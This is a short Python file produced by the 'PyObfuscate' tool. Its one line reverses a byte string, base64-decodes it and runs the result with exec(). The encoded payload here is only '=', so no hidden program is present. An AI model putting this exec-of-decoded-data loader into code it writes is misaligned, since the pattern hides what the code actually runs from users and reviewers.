# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Thu Jul 28 19:33:24 2022
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))